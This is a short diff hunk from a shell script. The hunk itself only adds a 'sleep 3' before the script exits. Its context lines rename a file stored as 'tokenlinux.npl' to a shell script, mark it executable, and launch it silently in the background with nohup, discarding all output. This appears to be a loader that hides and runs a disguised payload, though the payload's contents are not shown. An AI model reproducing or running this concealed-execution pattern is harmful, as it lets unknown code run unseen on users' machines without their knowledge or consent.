@@ -20,5 +20,8 @@ fi
 mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
 chmod +x "$TARGET_DIR/tokenlinux.sh"
 nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
+
+sleep 3
+
 exit 0
 
